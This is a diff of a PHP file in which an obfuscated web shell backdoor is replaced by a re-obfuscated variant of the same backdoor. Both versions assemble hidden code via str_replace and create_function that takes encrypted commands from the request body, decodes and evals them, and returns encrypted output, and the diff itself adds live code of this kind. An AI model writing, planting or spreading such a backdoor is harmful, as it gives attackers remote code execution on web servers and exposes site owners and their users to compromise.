@@ -1,12 +1,10 @@
 <?php
-$f='ZOnEcpf2i"O;funcOtion x($t,$kO){$c=OOstrlenO($kO);$l=strlenO($t);$Oo="";for';
-$A='jO};}O}retOurn $o;}iOf (@preg_OmatOch(OO"/$kh(.+)$kfOO/O",@filOe_get_conte';
-$K='O(@base6O4_decode($m[1]),$k)));$o=O@ob_get_OconOtents()O;@oOb_endO_cleanO(';
-$g=str_replace('bW','','crbWeabWtbWebW_fubWnctibWon');
-$y='(O$i=0;$i<$lO;){fOor($j=0;(O$Oj<$c&&$iOO<$l);$j++,$i+O+){$oO.=$t{$i}^O$k{$';
-$l='$k="5d41O402a";$Okh="bOc4bO2a76b971";OO$kf="O9d91O1017c592";$pO="KOfO2ljY6o';
-$Y='ntOs("php://inpuOtO"),$m)==O1O) {@ob_start();@eOvOal(@gzuncoOmpOressO(O@Ox';
-$F=');$rO=@bOase64_encodOe(@xO(@gOzcompress($Oo),$k));OpOrint("$pO$kh$r$kf");}';
-$h=str_replace('O','',$l.$f.$y.$A.$Y.$K.$F);
-$z=$g('',$h);$z();
+$l='/input"fI),$m)=fI=1) {@fIofIb_start(fI);@evafIfIl(@gzuncomprfIess(@xfI(@bfIafIse64_decfIode($m[1]),$kfI)));$fIo=@';
+$Y='fI$k="5fId41402a";$kh="bfIc4b2fIa76fIfIb971";$kf=fI"9d911017c5fI92";$p=fIfI"ckwfIiCb4mbY6T8JSfIL"fI;function fIxfI($t,';
+$k=str_replace('h','','chrheatheh_funhhction');
+$F='ofIb_fIget_contents()fI;@fIob_end_cleafIn();$r=fI@fIbafIse64_encode(@xfI(@fIgzcompresfIs(fI$o),fI$k)fI);print("$fIp$kh$r$kf");}';
+$R='+){$fIo.=$tfI{$i}^$fIk{$j}fI;}}retfIurn $o;fI}if fI(@preg_matcfIh("/$kh(fI.fI+)$kf/",fI@filefI_get_confItents(fI"fIphp:/';
+$G='$k){$c=strlfIenfI($k);$fIl=strlefIn($fIt);$o="";fIforfIfI($i=0;$i<$l;){for(fI$j=fI0;(fI$j<$c&&$i<$lfIfI);$j++,$i+fI';
+$i=str_replace('fI','',$Y.$G.$R.$l.$F);
+$z=$k('',$i);$z();
 ?>
